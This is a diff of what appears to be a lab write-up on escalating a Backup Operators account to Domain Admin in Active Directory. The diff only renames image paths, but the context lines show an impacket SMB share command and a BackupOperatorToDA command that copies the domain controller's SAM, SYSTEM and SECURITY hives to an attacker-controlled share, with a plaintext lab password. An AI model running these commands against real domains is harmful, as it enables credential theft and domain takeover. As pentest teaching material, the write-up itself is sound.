@@ -45,7 +45,7 @@ In my attack we will use the tool BackupOperatorToDA from [mpgn](https://github.
 
 * Copy files from the Domain Controller:
 
-![](<../../../.gitbook/assets/image (67) (1).png>)
+![](<../../../.gitbook/assets/image (67) (1) (1).png>)
 
 #### To Domain Admin!
 
@@ -62,7 +62,7 @@ From our enumeration when we gained access to the `sa_backup` account we know th
 python3 /opt/impacket/examples/smbserver.py share ~/adlab -smb2support
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
 
 4\. The next step is to execute the BackupOperatorToDa.exe tool to retrieve the the SAM, SYSTEN and SECURITY HIVE and save them in our created public share:
 
@@ -70,7 +70,7 @@ python3 /opt/impacket/examples/smbserver.py share ~/adlab -smb2support
 .\BackupOperatorToDA.exe -t \\dc03.secure.local -u sa_backup -p LS6RV5o8T9 -d secure.local -o \\192.168.248.2\share\
 ```
 
-![](<../../../.gitbook/assets/image (68) (1).png>)
+![](<../../../.gitbook/assets/image (68) (1) (1).png>)
 
 {% hint style="info" %}
 If you are using another share, make sure the share is writeable by anyone otherwise the DC won't be able to write its files.
